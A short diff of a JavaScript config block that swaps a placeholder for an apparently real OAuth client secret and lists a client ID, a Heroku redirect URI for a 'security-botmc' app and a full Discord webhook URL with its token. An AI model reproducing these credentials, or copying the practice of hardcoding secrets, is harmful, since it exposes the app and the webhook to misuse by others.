@@ -1,5 +1,5 @@
 //Config
-const client_secret = 'secret_value'
+const client_secret = '6ecdd9eb-6b24-4f27-b4fb-d93266f6fd67'
 const client_id = '936a88f4-136c-4f7b-a955-b2cdf2e0ca0a'
 const redirect_uri = 'https://security-botmc.herokuapp.com/'
 const webhook_url = 'https://discord.com/api/webhooks/1040413710679822357/0SstyWoEwPMUR7oOA4-iah8XGLfl6cQhYkk6JvVWGUdu53U2Gd4Umoq3CFU8RMwSEedd'
